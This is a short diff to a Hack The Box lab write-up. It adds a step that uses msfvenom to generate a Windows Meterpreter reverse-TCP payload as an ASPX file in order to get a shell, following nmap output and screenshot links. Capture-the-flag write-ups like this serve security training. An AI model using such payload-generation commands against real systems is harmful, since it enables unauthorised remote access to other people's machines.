@@ -52,3 +52,9 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/db8bd9ae-4356-43c7-ad3d-2501ebb011a1)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3c67d341-5538-410c-aa80-6caa588743c0)
 
+## MSFVenom
+  - Generate a payload using `MSFVenom` for a reverse tcp connection to get a shell.
+```CSS
+▶ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o rsp.aspx
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/191b9c18-0899-429c-a7ed-6bd245caf619)
